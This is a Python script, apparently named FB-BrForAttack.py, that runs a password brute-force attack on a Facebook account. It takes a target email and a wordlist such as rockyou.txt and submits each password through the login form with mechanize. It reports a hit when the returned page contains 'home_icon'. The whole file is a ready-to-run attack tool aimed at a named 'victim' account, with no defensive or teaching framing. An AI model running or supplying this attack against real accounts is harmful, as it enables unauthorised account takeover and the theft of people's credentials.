#!/usr/bin/python
# -*- coding: utf-8 -*-

#I Love Python(^-^)

##-------- Import Libraries --------##
import socket,time,os,optparse	    ##
##----------------------------------##

################## check internet #################
server = "www.google.com"                         #
def check():                                      #
   try:                                           #
      s = socket.gethostbyname(server)            #
      ss = socket.create_connection((s, 80), 2)   #
      return True                                 #
   except:                                        #
         pass                                     #
   return False                                   #
                                                  #
check = check()                                   #
###################################################

parse = optparse.OptionParser("""\nUsage:python ./FB-BrForAttack.py -F <Target Email> -W <Wordlist file>

OPTIONS:
        -F <target email>        ::>   Set target Email
        -W <word list file>      ::>   Set Wordlist File 

Example:
        ./FB-BrForAttack.py -F victim@gmail.com -W /usr/share/wordlists/rockyou.txt
""")

def Main():
   parse.add_option("-F","--victim",dest="taremail",type="string",
			help="target email !")
   parse.add_option("-W","--wordlist",dest="wlst",type="string",
			help="wordlist file !")
   (options,args) = parse.parse_args()
   if options.taremail !=None and options.wlst !=None: 
     user = options.taremail
     passw = options.wlst
     try:
	import mechanize
     except:
	   print("[!] The [ mechanize lib ] is Not found!\n[*]Please run this command> [ pip install mechanize ]")
	   exit()

     global check
     if check == True:
	         try:
		    passwfile = open(passw, "r")
		 except:
                        print("\n[> "+passw+" <] File Not Found !\n")
                        exit()
		 os.system("clear || cls")
		 print("\n[*]website>: www.facebook.com ")
		 time.sleep(1)
		 print("\n[+]Target Email>: "+str(user))
		 time.sleep(1.2)
		 print("\n[@]Wlist>: "+str(passw))
		 time.sleep(1)
		 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
		 time.sleep(1.1)
		 print("\n[$]Brute Force Attack Start[$]\n")
		 time.sleep(0.8)
		 lo = 1
		 for password in passwfile:
				          try:
                		             br1=mechanize.Browser()
                		             br1.set_handle_robots(False)
                                             br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                		             op=br1.open("https://facebook.com")
                		             dos1=open("Facebook-Log.txt","w+")		
                	                     br1.select_form(nr=0)
                		             br1.form["email"]=user
                		             br1.form["pass"]=password
                		             br1.method="POST"
                		             br1.submit()
               			             dos1.write(br1.open("https://facebook.com").read())
                		             dos1.seek(0)
                		             text=dos1.read().decode("UTF-8")
                		             if(text.find("home_icon",0,len(text))!=-1):
                   			        print ("\n[*]Found! Password is ==> "+ password)
						dos1.close()
						os.system("rm Facebook-Log.txt || del Facebook-Log.txt")
					        exit()
                		             else:
                    			          print ('[!]Trying password:[%s--[%s '%(lo,password))
						  lo +=1

            			          except KeyboardInterrupt:
                                                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
						 dos1.close()
						 os.system("rm Facebook-Log.txt || del Facebook-Log.txt")
						 exit()
     elif check == False:
		    print("\n[!] Please Check Your Internet Connection !!!")
		    exit(0)
   else:
	print(parse.usage)

if __name__=='__main__':
	Main()

